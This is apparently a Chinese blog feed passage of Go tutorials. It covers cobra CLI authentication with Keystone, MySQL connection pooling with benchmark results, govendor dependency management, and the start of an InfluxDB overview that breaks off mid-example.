PersistentPreRunE: 无论函数 执不执行 该函数都会运行 PreRunE: 在函数执行前执行 RunE: 执行函数 PostRunE: 函数执行后执行 PersistentPostRunE: 无论函数 执不执行 该函数都会执行 利用cobra提供的PersistentPreRunE来实现验证功能123456789101112// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "app-cli", Short: "A brief description of your application", Long: `A longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, PersistentPreRunE: auth,&#125; auth函数实现认证并不难, 关键是auth过后的token 如何传递给后面的子命令使用, 参考etcdctl和docker部分都使用上下文来实现这个需求, cobra里面也没有地方给我存上下文, 因此需要专门用一个模块来保持 全局的上下文, 因此需要手动实现一个common包。123456789101112131415161718192021222324252627282930313233343536package common// GlobalFlag use to contain the all contextvar GlobalFlag *globalFlagtype globalFlag struct &#123; endpoint string token string&#125;func (g *globalFlag) SetToken(token string) &#123; g.token = token&#125;func (g *globalFlag) GetToken() string &#123; return g.token&#125;func (g *globalFlag) SetEndPoint(url string) &#123; g.endpoint = url&#125;func (g *globalFlag) GetEndPoint() string &#123; return g.endpoint&#125;func (g *globalFlag) GetClient() *Client &#123; client, _ := NewClient(g.endpoint, g.token) return client&#125;func init() &#123; if GlobalFlag == nil &#123; GlobalFlag = &amp;globalFlag&#123;&#125; &#125;&#125; 最后在common包里面添加2个子包: keystone, printTable, keystone 用于实现与keystone认证的过程, printTable用于打印最后结果的表格,具体详情请看源码。 添加资源为每一个资源添加5个基础的操作:get, list, create, delete, update。另起一个resourceA的包，实现这些方法，添加到子命令即可， 比如:123456789func init() &#123; RootCmd.AddCommand(resourceACmd) resourceACmd.AddCommand(resourceA.CreateCmd, resourceA.ListCmd, resourceA.GetCmd, resourceA.UpdateCmd, resourceA.DeleteCmd)&#125; 大概效果如下123456789101112131415161718192021222324252627282930➜ app-cli git:(master) ✗ go run main.go resourceA -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: app-cli resourceA [flags] app-cli resourceA [command]Available Commands: create create an resource delete delete an resource get get an resource list list resources update update an resourceGlobal Flags: --api-endpoint string unires service endpoint --auth_url string keyston auth url --idenntity-api-version string keystone auth version --password string keystone auth user password --project-domain-name string keystone auth user project domain --project-name string keystone auth user project name --user-domain-name string keystone auth user domain name --username string keystone auth userUse "app-cli resourceA [command] --help" for more information about a command. 使用效果和使用openstack一样，你需要有一个admin_openrc 用于导入环境变量12345678export OS_USERNAME=adminexport OS_PASSWORD=adminexport OS_PROJECT_NAME=admin.cloudexport OS_USER_DOMAIN_NAME=adminexport OS_PROJECT_DOMAIN_NAME=adminexport OS_AUTH_URL=http://127.0.0.1:35357/v3export OS_IDENTITY_API_VERSION=3export UNIRES_ENDPOINT=http://127.0.0.1:8080 比如12source admin_openrc./app-cli resourceA get]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>openstack</tag>
        <tag>cobra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang中mysql连接池使用]]></title>
    <url>%2F2017%2F04%2F05%2Fgolang-mysql-connection-pool%2F</url>
    <content type="text"><![CDATA[在使用golang来处理数据库的时候，为了提升性能，往往都会使用连接池，有些人往往会自己实现一个连接池，用来互用mysql连接，但是如果你稍微细心一点， 就会发现内建的sql包已经实现了连接池。sql.Open函数实际上式返回一个连接池对象，而不是单个连接。 golang本身没有提供链接mysql的驱动，但是却定义了数据库的标准接口(内建的sql包), 第三方开发实现这些接口就完成了相应驱动的开发。第三方提供mysql的驱动比较多，遵循官方sql接口规范的也有好几个, 但是使用最广的,github上星最多应该是https://github.com/go-sql-driver/mysql, 以下的所有操作都以该驱动进行演示。 数据库的基本操作这里主要介绍数据库操作中一些常见操作，比如建表，以及数据的增删改查。 首先，我们需要创建一张表，用于存储数据, 我们可以通过db的Exec来执行SQL语句，比如下面是一个创建表的函数:123456789101112131415161718192021func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户编号', user_name VARCHAR(45) NOT NULL COMMENT '用户名称', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户年龄', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户性别', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户表'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125; 有了表过后，我们需要插入数据, 理论上可以将插入的SQL语句准备好, 填入Exec即可，但是sql已经对这种常用的场景抽象出了一个Prepare方法，Prepare方法将SQL的逻辑和数据剥离开来，通过占位符来生成一个SQL表达式(statement),然后表达式执行时，传入具体的需要插入的数据:123456789101112func insert() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125; 插入数据过会我们就可以，从中查询数据记录了，查询出来的数据以行为单位进行组织（Rows)， Row包含字段和值，通过rows.Columns()获取字段，通过rows.Next()获取值，这里需要注意Next()这个方法，它和python里面的生成器概要很像，Next返回一个bool值，表示是否有新的row数据准备好了，如果准备好了，使用rows.Scan()来获取准备好的数据1234567891011121314151617181920212223func query() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) for rows.Next() &#123; var userId int var userName string var userAge int var userSex int rows.Columns() err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) checkErr(err) fmt.Println(userId) fmt.Println(userName) fmt.Println(userAge) fmt.Println(userSex) &#125;&#125; 这样扫描我们的确能获取到数据，但是数据并没有被友好的组织起来，在python的mysql驱动中提供一个简单方法可以将这些行数据组织成一个dict返回，因此在golang中，我们可以将rows的数据组织成一个map返回，方便使用。12345678910111213141516171819202122232425262728func queryToMap() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) //字典类型 //构造scanArgs、values两个数组，scanArgs的每个值指向values相应值的地址 columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //将行数据保存到record字典 err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; fmt.Println(record) &#125;&#125; 接下来是数据的更新, 更新和数据的插入原理一致，只是在准备的SQL里面通过WHERE指定条件，以更新指定的数据记录。123456789101112func update() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`UPDATE user SET user_age=?,user_sex=? WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(21, 2, 1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; 最后是数据的删除，同理123456789101112func remove() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`DELETE FROM user WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; 如何设置连接池数据库标准接口里面有3个方法用于设置连接池的属性: SetConnMaxLifetime, SetMaxIdleConns, SetMaxOpenConns SetConnMaxLifetime: 设置一个连接的最长生命周期，因为数据库本身对连接有一个超时时间的设置，如果超时时间到了数据库会单方面断掉连接，此时再用连接池内的连接进行访问就会出错, 因此这个值往往要小于数据库本身的连接超时时间 SetMaxIdleConns: 连接池里面允许Idel的最大连接数, 这些Idel的连接 就是并发时可以同时获取的连接,也是用完后放回池里面的互用的连接, 从而提升性能。 SetMaxOpenConns: 设置最大打开的连接数，默认值为0表示不限制。控制应用于数据库建立连接的数量，避免过多连接压垮数据库。 代码上使用就很简单了, 初始化db时，根据需求设置好连接池。123456789var db *sql.DB func init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping()&#125; 性能对比连接池对性能的提升还是很明显的, 下面我们就测试对比一下 使用连接池和不使用连接池时的性能差别。测试代码如下(不使用连接池时 注释掉连接池相关设置):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( "database/sql" "fmt" "log" "net/http" "time" _ "github.com/go-sql-driver/mysql")var db *sql.DBfunc init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping() createTable() insert()&#125;func main() &#123; startHttpServer()&#125;func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户编号', user_name VARCHAR(45) NOT NULL COMMENT '用户名称', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户年龄', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户性别', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户表'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125;func insert() &#123; stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125;func queryToMap() []map[string]string &#123; var records []map[string]string rows, err := db.Query("SELECT * FROM user") defer rows.Close() checkErr(err) //字典类型 //构造scanArgs、values两个数组，scanArgs的每个值指向values相应值的地址 columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //将行数据保存到record字典 err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; records = append(records, record) &#125; return records&#125;func startHttpServer() &#123; http.HandleFunc("/pool", pool) err := http.ListenAndServe(":9090", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125;func pool(w http.ResponseWriter, r *http.Request) &#123; records := queryToMap() fmt.Println(records) fmt.Fprintln(w, "finish")&#125;func checkErr(err error) &#123; if err != nil &#123; fmt.Println(err) panic(err) &#125;&#125; 带连接池的测试结果:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455➜ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 0.832 secondsComplete requests: 1000Failed requests: 928 (Connect: 0, Receive: 0, Length: 928, Exceptions: 0)Total transferred: 114144 bytesHTML transferred: 6496 bytesRequests per second: 1201.65 [#/sec] (mean)Time per request: 83.219 [ms] (mean)Time per request: 0.832 [ms] (mean, across all concurrent requests)Transfer rate: 133.95 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 4 4.6 2 18Processing: 8 79 107.2 47 489Waiting: 0 71 107.9 40 488Total: 12 82 106.4 49 491Percentage of the requests served within a certain time (ms) 50% 49 66% 59 75% 67 80% 80 90% 159 95% 394 98% 450 99% 479 100% 491 (longest request) 去除连接池的设置后的测试结果:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455➜ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 1.467 secondsComplete requests: 1000Failed requests: 938 (Connect: 0, Receive: 0, Length: 938, Exceptions: 0)Total transferred: 115374 bytesHTML transferred: 6566 bytesRequests per second: 681.83 [#/sec] (mean)Time per request: 146.664 [ms] (mean)Time per request: 1.467 [ms] (mean, across all concurrent requests)Transfer rate: 76.82 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 1.7 1 19Processing: 8 139 106.8 109 415Waiting: 0 133 110.7 81 415Total: 10 141 107.4 110 418Percentage of the requests served within a certain time (ms) 50% 110 66% 210 75% 237 80% 250 90% 285 95% 321 98% 378 99% 393 100% 418 (longest request) 结论 同样的并发情况下, 使用连接池比没使用快一倍, 在高并发的情况下，应该更明显。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>go-sql-drive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang包管理之vendor]]></title>
    <url>%2F2017%2F03%2F13%2Fgolang-pkg-management-tool%2F</url>
    <content type="text"><![CDATA[在使用Golang过程中，有一个非常令人头大的问题: 缺少依赖库版本功能管理, 比如某些依赖在某个commit之后发生了API变更之后，如果不修改代码很难兼容，然而开发者之间很有可能因为参与的时间不同，导致执行go get命令获取的版本不同，而导致各种问题, 甚至是编译不通过。因此需要有一个包依赖的版本控制工具。 vendor之前在vendor出来之前, 以godep为主比较流行, godep的原理非常简单:godep把第三包的版本依赖信息记录在Godeps.json下，并且把第三包完整拷贝一份到vendor下面。通过对Godeps.json文件进行版本管理即可以管理整个项目的第三方包依赖信息。 可以看到godep只是把第三方包进行单独到依赖管理，而新增到第三包还是会被get到GOPATH中, 如果多个项目用同一个第三包的不同版本时, 那就完蛋了 vendor的历史vendor机制就是用来解决第三方包依赖问题: golang 1.5引入, 默认是关闭的, 通过手动设置环境变量:GO15VENDOREXPERIMENT=1开启 golang 1.6默认开启 goalng 1.7 vendor作为功能支持,取消GO15VENDOREXPERIMENT环境变量 vendor的原理很简单: 将第三方依赖放入当前项目vendor目录中， 编译的时候从vendor目录中查找依赖而不从GOPATH/src中对应目录中查找。新增的第三方包直接被get到根目录的vendor文件夹下,不会与其它的项目混用第三方包，完美避免多个项目同用同一个第三方包的不同版本问题。因此只需要对vendor/vendor.json进行版本控制，即可对第三包依赖关系进行控制。 vendor的使用想要详细了解govendor请参考govendor 安装govendor 1go get -u -v github.com/kardianos/govendor 创建一个golang的项目 比如我创建一个简单的依赖ssh服务的包1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String()) 初始化vendor文件 12345678910111213➜ govendor_test govendor init➜ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;➜ govendor_test tree ..├── main.go└── vendor └── vendor.json 初始化完成后会生成一个vendor的文件夹, 因为我还没添加依赖, 所以vendor.json里面并没有相关依赖包的描述 添加依赖的第三方包 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182➜ govendor_test govendor add +external➜ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [ &#123; &quot;checksumSHA1&quot;: &quot;C1KKOxFoW7/W/NFNpiXK+boguNo=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/curve25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;wGb//LjBPNxYHqk+dcLo7BjPXK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;LXFcVx8I587SnWmKycSDEq9yvK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519/internal/edwards25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;fsrFs762jlaILyqqQImS1GfvIvw=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ssh&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125; ], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;➜ govendor_test tree ..├── main.go└── vendor ├── golang.org │ └── x │ └── crypto │ ├── LICENSE │ ├── PATENTS │ ├── curve25519 │ │ ├── const_amd64.h │ │ ├── const_amd64.s │ │ ├── cswap_amd64.s │ │ ├── curve25519.go │ │ ├── doc.go │ │ ├── freeze_amd64.s │ │ ├── ladderstep_amd64.s │ │ ├── mont25519_amd64.go │ │ ├── mul_amd64.s │ │ └── square_amd64.s │ ├── ed25519 │ │ ├── ed25519.go │ │ └── internal │ │ └── edwards25519 │ │ ├── const.go │ │ └── edwards25519.go │ └── ssh │ ├── buffer.go │ ├── certs.go │ ├── channel.go │ ├── cipher.go │ ├── client.go │ ├── client_auth.go │ ├── common.go │ ├── connection.go │ ├── doc.go │ ├── handshake.go │ ├── kex.go │ ├── keys.go │ ├── mac.go │ ├── messages.go │ ├── mux.go │ ├── server.go │ ├── session.go │ ├── tcpip.go │ └── transport.go └── vendor.json9 directories, 36 files 我们发现vendor.json的package已经记录了第三方包的版本,并且把这些依赖的包都放到vendor目录下了 根据自己的需求,选择是否将vendor目录做版本控制 一般只需要将vendor.json做版本控制即可,但是对于那些需要翻墙才能下载的包也可以直接将vendor都纳入版本控制添加.ignore.git仅对vendor.json做版本控制123456git initecho &quot;vendor/golang.or&quot; .gitignoregit add .git commit -m &quot;test commit&quot;git push -u origin master... 其他小伙伴安装依赖 其他小伙伴如果需要使用这个项目, 拉下该项目12git clone ssh://git@xxx/govendor_test.githttps_proxy=http://localhost:8123 govendor sync (我需要安装golang.org的包,因此需要FQ) 这样就安装了该项目的指定版本的第三个依赖。接下来愉快的玩耍吧!]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>vendor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[时序数据库之InfluxDB]]></title>
    <url>%2F2017%2F03%2F10%2Fopentsdb-vs-influxdb%2F</url>
    <content type="text"><![CDATA[最近公司业务重度依赖时序数据库, 公司上个版本选择了OpenTSDB, 在1-2年前，他的确很流行。 但是在做软件重构时, 业务层反馈的一些问题, OpenTSDB暂时无法解决,成为了一个痛点, 让我需要考虑其他方案, 由于之前使用过InfluxDB, 也一直在关注, 它给了我惊艳的感觉,所以记忆犹新. 背景之前做运维时,重度使用过zabbix, 关系型数据库的优化,根本无法解决高IO, 后面又使用过Graphite, 这个安装像迷一样的工具, 它后端在RRD上面设计出了一个简单的时序数据库, 但是配置繁杂,容量完全靠规划。直到使用了InfluxDB, 部署简单,使用方便,高压缩, 对它印象很不错, 但是0.12过后不支持集群。 之前InfluxDB切换了2次存储引擎(它的存储是插件式的), 也没去了解过它切换的原因, 直到看到InfoQ上七牛的演讲从InfluxDB看时序数据的处, 他道出了了原因: LevelDB不支持热备份, influxDB设计的shard会消耗大量文件描述符，将系统资源耗尽。 BoltDB解决了热备, 解决了消耗大量文件描述符的问题, 但是引入了一个更致命的问题:容量达到数GB级别时,会产生大量随机写, 造成高IOPS。 放弃了他们, 在他们的经验上开始自己实现一个存储引擎: TSM(Time-Structured Merge Tree), 它截取了OpenTSDB的一些设计经验,根据LSM Tree针对时间序列数据进行优化 我认为像这样的针对特殊场景进行优化的数据库会是今后数据库领域发展的主流, 另一个证明就是EleasticSearch一个针对文本解索而设计的数据库, 虽然OpenTSDB也针对时序数据做了优化,但是由于存储系统依然依赖HBase, 所以力度上面感觉没InfluxDB给力。 社区一路走来之艰辛,但是却激情洋溢,他们是先行者. 我对它集群的闭源并不反感, 这群激情洋溢的人需要有商业支持。 时序数据库热度排名这是DB Engine的时序数据库2017的排行榜, 截图是2017-3月的，最新的可以点DB-Engines Ranking of Time Series DBMS上图可以看出InfluxDB最近很热, 领先优势明显下面是对比InfluxDB, OpenTSDB, Graphite的变化趋势。对于一个设计精良，部署简单，使用方便，而且还高性能的时序数据库而言, 想不热都难。 简介基于Go语言开发，社区非常活跃，项目更新速度很快，日新月异，关注度高, 1.0发布过后, 稳定性也非常高。官方是这样介绍InfluxDB的： influxdb是一个从底层一步一步成长为能处理高写入,高查询的时序数据库, 它专门针对时序数据做了优化,让其更高性能, 他可以用来存储任何时序数据, 包括DevOps的监控、应用指标、物联网传感器的数据, 并实时分析 这是它github上给出的特性说明: 内建HTTP API, 无需自己实现 数据高压缩, 支持非常灵活的查询访问 支持类SQL查询, 学习成本低, 方便使用 安装和管理都十分简单, 数据写入和读取的速度快 为实时查询而生, 对每一个点位都建立索引, 及时查询响应速度小于100ms 业务问题我们需要一个时序数据库, 他需要能解决我们以下这些问题: 一个测试指标多值一个指标往往有多个维度来描述其变化状态,并不仅仅是值, 比如对于CPU的而言, 应该有中断，负载, 使用率等。 多Tag支持tag是对一个指标的描述,是一个标签, 在业务上Tag对于分组过滤非常有意义, 用于标示一个指标在业务上的意义, 比如对于IOT来说, 传感器的指标往往是一个无意义的id, 因此需求给它打上name标签, 标示他的特殊意义, 打上设备ID, 标示它属于哪个设备, 打上位置标签, 标示该指标来源于哪个地方。 在指标的值上能做一些基本的比较运算作为一个数据库,在功能层面需要解决一些基本的运算, 比如求和，求最小，求最大, 但这还不够, 需要支持条件过滤, 支持Tag的条件过滤, 支持值的条件过滤, 支持值的条件过滤是关键, 不然会产生巨大的数据复制, 比如我们需要过滤出 CPU &gt; 90的机器, 如果数据库不支持, 那么我需要将这些数据从数据库中查出来,复制给我的程序处理。 这带来了巨大的问题: 1. 数据库要吐出如此大量的数据, 负载升高, 出口流量暴增 2.程序拿到如此大量的数据, 给处理方带来了巨大的计算压力, 如果前段采用Angular或者React来写, 一个运行在pc上的小小的浏览器,根本处理不了。3. 处理效率低，数据的处理本该在数据存储的地方进行, 比如Hadoop, 完全没必要复制。 指标计算的中间结果需要存会指标这是一个比较常见的场景, 使用RDD时更是常用,比如数据是按照30秒存储的，但是我需要 这样一个聚合维度 5m, 15m, 1h, 3h, 12h, 然后我平时只使用这些维度的数据, 不用每次临时计算。 概念介绍influxDB的核心概念包含: Line Protocol, Retention Policy, Series, Point, Continuous Query. Line ProtocolLine Protocol用于描述存入数据库的数据格式, 也可以说是数据协议, 相比于JSON格式，Line Protocol无需序列化，更加高效, 官方对它做了全面的介绍Line Protocol, 下面摘取语法部分做简要说明：Line Protocol里面的一行就是InfluxDB里面的一个点位, 他将一个点分割成measurement, tag_set, field_set, timestamp4个部分, 例如:12345678910语法格式: measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]栗子:weather,location=us-midwest temperature=82 1465839830100400200 | -------------------- -------------- | | | | | | | | |+-----------+--------+-+---------+-+---------+|measurement|,tag_set| |field_set| |timestamp|+-----------+--------+-+---------+-+---------+ measurement: metric name, 需要监控的指标的名称, 比如上面的weather tag_set: 使用”,”与measurement隔开, 表示一组Tag的集合, 用于保存点位的元数据, 为可选项, 会进行索引，方便查询时用于过滤条件， 格式: =,=, 比如上面的location=us-midwest field_set: 使用空格与tag_set隔开, 标示一组Field的集合, 用于保存该点位多维度的值, 支持各种类型，数据存储时不会进行索引,格式: =,=, 比如上面的temperature=82 timestamp: 采集该点位的时间戳, 时间的默认精度是纳秒. 存储策略:measurements,tag keys,field keys,tag values全局存一份。field values和timestamps每条数据存一份。 Retention Policy指数据的保存策略, 包含数据的保存时间和副本数(集群中的概念),默认保存时间是永久，副本是1个, 但是我们可以修改, 也可以创建新的保存策略 SeriesInfluxDB中元数据的数据结构体, series相当于是InfluxDB中元数据的集合，在同一个database中，retention policy、measurement、tag sets完全相同的数据同属于一个series，同一个series的数据在物理上会按照时间顺序排列存储在一起。series 的key为 measurement+所有tags的序列化字符串, 他保存着该series的Retention policy, Measurement,Tag set, 比如:123456|--------------------------------------------------------------------------------------------------||Arbitrary series number | Retention policy | Measurement | Tag set ||series 1 | autogen | census | location = 1,scientist = langstroth ||series 2 | autogen | census | location = 2,scientist = langstroth ||series 3 | autogen | census | location = 1,scientist = perpetua ||--------------------------------------------------------------------------------------------------| PointInfluxDB中单条插入语句的数据结构体, 用于保存点位的值的集合, 每一个Point通过series和timestamp进行唯一标示:1234name: census-----------------time butterflies honeybees location scientist2015-08-18T00:00:00Z 1 30 1 perpetua Schema用于描述数据在InfluxDB的组织形式, InfluxDB的Schema十分简单由 这些概念组成: databases retention policies series measurements tag keys tag values field keys在操作数据库的时候，需要知道这些概念。 Continuous Query简称CQ, 是预先配置好的一些查询命令，SELECT语句必须包含GROUP BY time()，influxdb会定期自动执行这些命令并将查询结果写入指定的另外的measurement中。利用这个特性并结合RP我们可以方便地保存不同粒度的数据，根据数据粒度的不同设置不同的保存时间，这样不仅节约了存储空间，而且加速了时间间隔较长的数据查询效率，避免查询时再进行聚合计算。 存储引擎从LevelDB(LSM Tree)，到BoltD(mmap B+树)，现在是自己实现的TSM Tree的算法，类似LSM Tree，针对InfluxDB的使用做了特殊优化。 ShardShard这个概念并不对普通用户开放，Shard也不是存储引擎, 它在存储引擎之上的一个概念, 存储引擎负责存储shard, 因此在讲存储引擎之前先讲明shard。 在InfluxDB中按照数据的时间戳所在的范围，会去创建不同的shard，每一个shard都有自己的存储引擎相关文件，这样做的目的就是为了可以通过时间来快速定位到要查询数据的相关资源，加速查询的过程，并且也让之后的批量删除数据的操作变得非常简单且高效。 它和retention policy相关联。每一个存储策略下会存在许多shard，每一个shard存储一个指定时间段内的数据，并且不重复，例如7点-8点的数据落入shard0 中，8点-9点的数据则落入shard1中。每一个shard都对应一个底层的存储引擎。 当检测到一个shard中的数据过期后，只需要将这个shard的资源释放，相关文件删除即可，这样的做法使得删除过期数据变得非常高效。 LevelDBBoltDBTSM Tree功能使用安装与部署我这里主要做功能测试, 后面会有机会专门做性能测试, 因此这里使用官方提供的docker镜像部署,官方镜像最新也是1.2版本配置Daocloud的镜像加速源或者阿里的加速源,然后直接拉取镜像1docker pull influxdb 由于influxDB开发时就设计好了, 官方也给出了环境配置变量,启动时可以通过这些环境变量对influxdb进行配置InfluxDB配置 函数与SQL内部提供很多函数,方便一些基本操作InfluxQL Functions123456789101112131415161718192021222324252627282930&gt; SELECT MEAN("water_level") FROM "h2o_feet" WHERE "location"='coyote_creek' AND time &gt;= '2015-08-18T00:06:00Z' AND time &lt;= '2015-08-18T00:54:00Z' GROUP BY time(18m)name: h2o_feettime mean---- ----2015-08-18T00:00:00Z 7.9462015-08-18T00:18:00Z 